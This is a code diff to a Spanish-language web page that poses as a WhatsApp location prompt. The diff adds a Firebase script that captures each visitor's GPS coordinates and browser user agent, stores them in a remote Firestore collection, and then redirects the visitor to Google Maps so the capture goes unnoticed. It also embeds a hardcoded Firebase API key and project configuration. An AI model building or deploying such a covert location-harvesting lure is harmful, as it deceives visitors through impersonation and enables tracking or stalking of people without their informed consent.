@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -41,26 +42,75 @@ iframe{
 
 <h2>whatsApp buscara la ubicación...</h2>
 
-<p>Por favor activa la ubicación y concede el permiso para continuar.</p>
+<p id="estado">Por favor activa la ubicación y concede el permiso para continuar.</p>
 
 <iframe
 src="https://maps.google.com/maps?q=Bogota%20Colombia&t=&z=12&ie=UTF8&iwloc=&output=embed">
 </iframe>
 
-<script>
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
+import {
+  getFirestore,
+  collection,
+  addDoc,
+  serverTimestamp
+} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDSWRC7tyowLD-ZnzvSzkTDS9L3P_eGfRM",
+  authDomain: "proyecto-1-ea0ed.firebaseapp.com",
+  projectId: "proyecto-1-ea0ed",
+  storageBucket: "proyecto-1-ea0ed.firebasestorage.app",
+  messagingSenderId: "440062306942",
+  appId: "1:440062306942:web:74eab86708e22587d7462f"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const estado = document.getElementById("estado");
+
+// Función para guardar la ubicación en Firestore
+async function guardarUbicacion(lat, lon) {
+    try {
+        await addDoc(collection(db, "ubicaciones"), {
+            lat: lat,
+            lon: lon,
+            fecha: serverTimestamp(),
+            userAgent: navigator.userAgent
+        });
+        console.log("Ubicación guardada correctamente en Firebase.");
+        estado.textContent = "✅ Ubicación guardada. Redirigiendo...";
+        return true;
+    } catch (error) {
+        console.error("Error al guardar la ubicación:", error);
+        estado.textContent = "⚠️ No se pudo guardar la ubicación, pero te redirigimos igual.";
+        return false;
+    }
+}
 
 if ("geolocation" in navigator) {
 
     navigator.geolocation.getCurrentPosition(
 
         // Si obtiene la ubicación
-        function(posicion){
+        async function(posicion){
 
             const lat = posicion.coords.latitude;
             const lon = posicion.coords.longitude;
 
-            window.location.href =
-            "https://www.google.com/maps?q=" + lat + "," + lon;
+            estado.textContent = "📍 Ubicación obtenida, guardando...";
+
+            // Primero guardamos en Firebase, luego redirigimos
+            await guardarUbicacion(lat, lon);
+
+            // Pequeña pausa para que se alcance a leer el mensaje
+            setTimeout(function(){
+                window.location.href =
+                "https://www.google.com/maps?q=" + lat + "," + lon;
+            }, 1200);
 
         },
 
